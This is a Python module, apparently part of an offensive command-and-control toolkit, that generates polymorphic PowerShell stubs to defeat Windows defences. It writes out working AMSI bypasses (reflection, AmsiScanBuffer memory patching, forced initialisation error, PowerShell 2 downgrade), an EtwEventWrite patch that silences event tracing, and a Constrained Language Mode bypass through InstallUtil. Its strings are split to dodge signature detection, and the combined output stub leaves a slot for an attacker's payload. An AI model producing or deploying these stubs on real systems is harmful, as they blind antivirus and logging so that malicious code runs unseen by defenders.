"""c2-37 ETW and AMSI evasion stubs.

Techniques from TryHackMe Runtime Detection Evasion room:
- AMSI bypass via reflection (amsiInitFailed)
- AMSI bypass via patching (AmsiScanBuffer)
- ETW patching (disable event tracing)
- PowerShell downgrade attack
- CLM (Constrained Language Mode) bypass

These generate code stubs that can be prepended to payloads
or used standalone. All are polymorphic -- each call generates
unique variable names.
"""
from __future__ import annotations

import base64
import random
import string


def _rand_var(prefix: str = "") -> str:
    """Generate random variable name."""
    word = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return prefix + word


class AMSIBypass:
    """Generate AMSI bypass stubs for PowerShell.

    Multiple techniques from the Runtime Detection Evasion room.
    Each generates unique code per call (polymorphic).
    """

    @staticmethod
    def reflection() -> str:
        """AMSI bypass via .NET reflection (Matt Graeber technique).

        Sets amsiInitFailed to True, causing AMSI to return AMSI_RESULT_NOT_DETECTED.
        """
        v_val = _rand_var("$")
        v_type = _rand_var("$")
        v_field = _rand_var("$")

        # Split strings to avoid static detection
        ns_parts = random.choice([
            ("'System.Management.Automation.'", "'Amsi'+'Utils'"),
            ("'Sys'+'tem.Man'+'agement.Auto'+'mation.'", "'AmsiUtils'"),
            ("'System.'+'Management.'+'Automation.'", "'Ams'+'iUtils'"),
        ])
        field_parts = random.choice([
            "'amsi'+'Init'+'Failed'",
            "'ams'+'iInitF'+'ailed'",
            "'a'+'msiInit'+'Failed'",
        ])
        flag_parts = random.choice([
            "'No'+'nPublic,S'+'tatic'",
            "'NonPu'+'blic,St'+'atic'",
            "'Non'+'Public'+',Static'",
        ])

        return (
            "{v_val}='SetValue'\n"
            "{v_type}=[Ref].Assembly.GetType({ns0}+{ns1})\n"
            "{v_field}={v_type}.GetField({field},{flags})\n"
            "{v_field}.{v_val}($null,$true)"
        ).format(
            v_val=v_val, v_type=v_type, v_field=v_field,
            ns0=ns_parts[0], ns1=ns_parts[1],
            field=field_parts, flags=flag_parts,
        )

    @staticmethod
    def patching() -> str:
        """AMSI bypass via AmsiScanBuffer patching.

        Overwrites the AmsiScanBuffer function in memory to always return clean.
        Uses P/Invoke to call GetProcAddress, GetModuleHandle, VirtualProtect.
        """
        v_win32 = _rand_var()
        v_handle = _rand_var("$")
        v_addr = _rand_var("$")
        v_out = _rand_var("$")
        v_patch = _rand_var("$")

        # Split DLL and function names
        dll_name = random.choice([
            "'ams'+'i.dll'",
            "'am'+'si'+'.dll'",
            "'a'+'msi.d'+'ll'",
        ])
        func_name = random.choice([
            "'Amsi'+'Scan'+'Buffer'",
            "'Am'+'siScan'+'Buf'+'fer'",
            "'AmsiS'+'canBuf'+'fer'",
        ])

        return (
            "$code = @\"\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class {cls} {{\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr GetModuleHandle(string n);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
            "}}\n"
            "\"@\n"
            "Add-Type -TypeDefinition $code -Language CSharp\n"
            "{handle} = [{cls}]::GetModuleHandle({dll})\n"
            "{addr} = [{cls}]::GetProcAddress({handle}, {func})\n"
            "{out} = 0\n"
            "[{cls}]::VirtualProtect({addr}, [uint32]5, 0x40, [ref]{out})\n"
            "{patch} = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n"
            "[System.Runtime.InteropServices.Marshal]::Copy({patch}, 0, {addr}, 6)"
        ).format(
            cls=v_win32, handle=v_handle, addr=v_addr,
            out=v_out, patch=v_patch,
            dll=dll_name, func=func_name,
        )

    @staticmethod
    def downgrade() -> str:
        """AMSI bypass via PowerShell v2 downgrade.

        PowerShell 2.0 doesn't have AMSI, so downgrading bypasses it entirely.
        Simple but effective and well-known.
        """
        return "powershell -Version 2"

    @staticmethod
    def force_error() -> str:
        """AMSI bypass by forcing an initialization error.

        Corrupts the AMSI context to make scanning fail silently.
        """
        v_ctx = _rand_var("$")
        return (
            "{ctx} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)\n"
            "[Ref].Assembly.GetType("
            "'System.Management.Automation.AmsiUtils'"
            ").GetField("
            "'amsiContext','NonPublic,Static'"
            ").SetValue($null, {ctx})"
        ).format(ctx=v_ctx)


class ETWBypass:
    """Generate ETW (Event Tracing for Windows) bypass stubs.

    ETW allows logging of .NET assembly loads, API calls, etc.
    Patching ETW prevents defenders from seeing what we execute.
    """

    @staticmethod
    def patch_etw_powershell() -> str:
        """Patch EtwEventWrite to disable ETW logging in PowerShell."""
        v_cls = _rand_var()
        v_handle = _rand_var("$")
        v_addr = _rand_var("$")
        v_out = _rand_var("$")
        v_patch = _rand_var("$")

        return (
            "$code = @\"\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class {cls} {{\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr GetModuleHandle(string n);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
            "}}\n"
            "\"@\n"
            "Add-Type -TypeDefinition $code -Language CSharp\n"
            "{handle} = [{cls}]::GetModuleHandle('ntdll.dll')\n"
            "{addr} = [{cls}]::GetProcAddress({handle}, 'EtwEventWrite')\n"
            "{out} = 0\n"
            "[{cls}]::VirtualProtect({addr}, [uint32]1, 0x40, [ref]{out})\n"
            "{patch} = [Byte[]](0xC3)  # ret instruction\n"
            "[System.Runtime.InteropServices.Marshal]::Copy({patch}, 0, {addr}, 1)"
        ).format(cls=v_cls, handle=v_handle, addr=v_addr, out=v_out, patch=v_patch)

    @staticmethod
    def disable_etw_reflection() -> str:
        """Disable ETW via .NET reflection (simpler method)."""
        return (
            "[Reflection.Assembly]::LoadWithPartialName('System.Core')\n"
            "[System.Diagnostics.Eventing.EventProvider].GetField("
            "'m_enabled','NonPublic,Instance'"
            ").SetValue("
            "[Ref].Assembly.GetType("
            "'System.Management.Automation.Tracing.PSEtwLogProvider'"
            ").GetField('etwProvider','NonPublic,Static').GetValue($null),"
            "0)"
        )


class CLMBypass:
    """Constrained Language Mode bypass techniques."""

    @staticmethod
    def check_clm() -> str:
        """PowerShell command to check current language mode."""
        return "$ExecutionContext.SessionState.LanguageMode"

    @staticmethod
    def bypass_via_installutil() -> str:
        """Bypass CLM using InstallUtil.exe (LOLBin)."""
        return (
            "# 1. Create C# file with your payload in [System.ComponentModel.RunInstaller(true)] class\n"
            "# 2. Compile: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:bypass.exe bypass.cs\n"
            "# 3. Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U bypass.exe\n"
            "# InstallUtil runs in Full Language Mode regardless of CLM policy"
        )

    @staticmethod
    def bypass_via_psv2() -> str:
        """Bypass CLM via PowerShell v2 downgrade."""
        return (
            "# PowerShell v2 doesn't enforce CLM\n"
            "powershell -Version 2 -c \"$ExecutionContext.SessionState.LanguageMode\"\n"
            "# Should return: FullLanguage"
        )


def generate_evasion_stub(
    amsi: bool = True,
    etw: bool = True,
    method: str = "reflection",
) -> str:
    """Generate a combined AMSI+ETW evasion stub for PowerShell.

    Args:
        amsi: Include AMSI bypass
        etw: Include ETW bypass
        method: AMSI bypass method (reflection, patching, downgrade, force_error)
    """
    parts = []

    if etw:
        parts.append("# --- ETW Bypass ---")
        parts.append(ETWBypass.patch_etw_powershell())

    if amsi:
        parts.append("\n# --- AMSI Bypass ---")
        if method == "reflection":
            parts.append(AMSIBypass.reflection())
        elif method == "patching":
            parts.append(AMSIBypass.patching())
        elif method == "force_error":
            parts.append(AMSIBypass.force_error())
        elif method == "downgrade":
            parts.append(AMSIBypass.downgrade())

    parts.append("\n# --- Your payload below ---")
    return "\n".join(parts)
